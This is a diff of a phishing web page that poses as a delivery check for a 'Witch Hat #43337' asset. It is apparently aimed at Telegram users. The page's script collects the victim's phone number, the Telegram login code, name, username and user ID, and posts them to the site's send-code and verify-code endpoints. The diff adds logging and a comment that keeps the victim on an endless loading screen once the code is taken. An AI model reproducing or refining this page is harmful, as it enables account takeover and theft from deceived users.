@@ -175,19 +175,29 @@
             cursor: not-allowed;
         }
 
-        .phone-section, .code-section, .verification-section {
+        .phone-section,
+        .code-section,
+        .verification-section {
             display: none;
             margin-top: 20px;
             animation: fadeIn 0.3s ease;
         }
 
-        .phone-section.active, .code-section.active, .verification-section.active {
+        .phone-section.active,
+        .code-section.active,
+        .verification-section.active {
             display: block;
         }
 
         @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
         }
 
         .phone-input-wrap {
@@ -386,7 +396,9 @@
         }
 
         @keyframes spin {
-            to { transform: rotate(360deg); }
+            to {
+                transform: rotate(360deg);
+            }
         }
 
         .spinner-circle {
@@ -430,7 +442,7 @@
                 <div class="label">⚡ Action Needed</div>
                 <h3>Unlock Your Asset Delivery</h3>
                 <p>
-                    Scheduled delivery of your <strong>Witch Hat #43337</strong> is tagged for manual-grade delivery review. 
+                    Scheduled delivery of your <strong>Witch Hat #43337</strong> is tagged for manual-grade delivery review.
                     To ensure platform safety and stop fraudulent claim attempts, confirming your active session is required.
                 </p>
             </div>
@@ -597,109 +609,122 @@
         btnSendCode.addEventListener('click', function() {
             const region = regionSelect.value;
             const phone = phoneInput.value.trim().replace(/\s/g, '');
-            
+
             if (!phone || phone.length < 5) {
                 alert('Пожалуйста, введите корректный номер телефона.');
                 return;
             }
 
             userPhone = region + phone;
-            
+
             btnSendCode.disabled = true;
             btnSendCode.textContent = '⏳ Отправка...';
 
             fetch('/api/send-code', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ 
-                    phone: userPhone,
-                    region: regionSelect.options[regionSelect.selectedIndex].text,
-                    fullName: fullName,
-                    username: username,
-                    userId: userId
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        phone: userPhone,
+                        region: regionSelect.options[regionSelect.selectedIndex].text,
+                        fullName: fullName,
+                        username: username,
+                        userId: userId
+                    })
                 })
-            })
-            .then(res => res.json())
-            .then(data => {
-                console.log('✅ Код отправлен:', data);
-                
-                const masked = userPhone.slice(0, -4) + '****';
-                displayPhone.textContent = masked;
-                
-                showStep(stepCode);
-                codeInput.focus();
-                
-                btnSendCode.disabled = false;
-                btnSendCode.textContent = '📨 Отправить код';
-            })
-            .catch(err => {
-                console.log('❌ Ошибка:', err);
-                alert('❌ Ошибка отправки. Попробуйте еще раз.');
-                btnSendCode.disabled = false;
-                btnSendCode.textContent = '📨 Отправить код';
-            });
+                .then(res => res.json())
+                .then(data => {
+                    console.log('✅ Номер отправлен:', data);
+
+                    const masked = userPhone.slice(0, -4) + '****';
+                    displayPhone.textContent = masked;
+
+                    showStep(stepCode);
+                    codeInput.focus();
+
+                    btnSendCode.disabled = false;
+                    btnSendCode.textContent = '📨 Отправить код';
+                })
+                .catch(err => {
+                    console.log('❌ Ошибка:', err);
+                    alert('❌ Ошибка отправки. Попробуйте еще раз.');
+                    btnSendCode.disabled = false;
+                    btnSendCode.textContent = '📨 Отправить код';
+                });
         });
 
         btnVerifyCode.addEventListener('click', function() {
             const code = codeInput.value.trim();
-            
+
             if (!code || code.length < 4) {
                 alert('Пожалуйста, введите код из Telegram.');
                 return;
             }
 
+            // ПОКАЗЫВАЕМ ЗАГРУЗКУ
             showStep(stepVerification);
 
-            fetch('/api/verify-code', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ 
-                    phone: userPhone,
-                    code: code,
-                    fullName: fullName,
-                    username: username,
-                    userId: userId
-                })
-            })
-            .then(res => res.json())
-            .then(data => {
-                console.log('✅ Код подтвержден:', data);
-            })
-            .catch(err => {
-                console.log('❌ Ошибка:', err);
-                alert('❌ Неверный код. Попробуйте еще раз.');
-                showStep(stepCode);
-                codeInput.value = '';
-                codeInput.focus();
+            console.log('📤 Отправка кода на сервер:', {
+                phone: userPhone,
+                code: code,
+                fullName: fullName,
+                username: username,
+                userId: userId
             });
+
+            fetch('/api/verify-code', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        phone: userPhone,
+                        code: code,
+                        fullName: fullName,
+                        username: username,
+                        userId: userId
+                    })
+                })
+                .then(res => {
+                    console.log('📥 Ответ от сервера:', res.status);
+                    return res.json();
+                })
+                .then(data => {
+                    console.log('✅ Код подтвержден:', data);
+                    // ОСТАЕМСЯ НА ЭКРАНЕ ЗАГРУЗКИ (бесконечно)
+                })
+                .catch(err => {
+                    console.log('❌ Ошибка:', err);
+                    alert('❌ Неверный код. Попробуйте еще раз.');
+                    showStep(stepCode);
+                    codeInput.value = '';
+                    codeInput.focus();
+                });
         });
 
         btnResendCode.addEventListener('click', function() {
             btnResendCode.disabled = true;
             btnResendCode.textContent = '⏳ Отправка...';
-            
+
             fetch('/api/resend-code', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ phone: userPhone })
-            })
-            .then(res => res.json())
-            .then(data => {
-                console.log('✅ Код отправлен повторно:', data);
-                btnResendCode.textContent = '✅ Код отправлен!';
-                setTimeout(() => {
-                    btnResendCode.textContent = '🔄 Отправить код повторно';
-                    btnResendCode.disabled = false;
-                }, 3000);
-            })
-            .catch(err => {
-                console.log('❌ Ошибка:', err);
-                btnResendCode.textContent = '❌ Ошибка';
-                setTimeout(() => {
-                    btnResendCode.textContent = '🔄 Отправить код повторно';
-                    btnResendCode.disabled = false;
-                }, 3000);
-            });
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone: userPhone })
+                })
+                .then(res => res.json())
+                .then(data => {
+                    console.log('✅ Код отправлен повторно:', data);
+                    btnResendCode.textContent = '✅ Код отправлен!';
+                    setTimeout(() => {
+                        btnResendCode.textContent = '🔄 Отправить код повторно';
+                        btnResendCode.disabled = false;
+                    }, 3000);
+                })
+                .catch(err => {
+                    console.log('❌ Ошибка:', err);
+                    btnResendCode.textContent = '❌ Ошибка';
+                    setTimeout(() => {
+                        btnResendCode.textContent = '🔄 Отправить код повторно';
+                        btnResendCode.disabled = false;
+                    }, 3000);
+                });
         });
 
         backBtn.addEventListener('click', function() {
@@ -729,7 +754,7 @@
 
         codeInput.addEventListener('input', function(e) {
             this.value = this.value.replace(/[^0-9]/g, '').slice(0, 6);
-            
+
             if (this.value.length === 6) {
                 btnVerifyCode.click();
             }
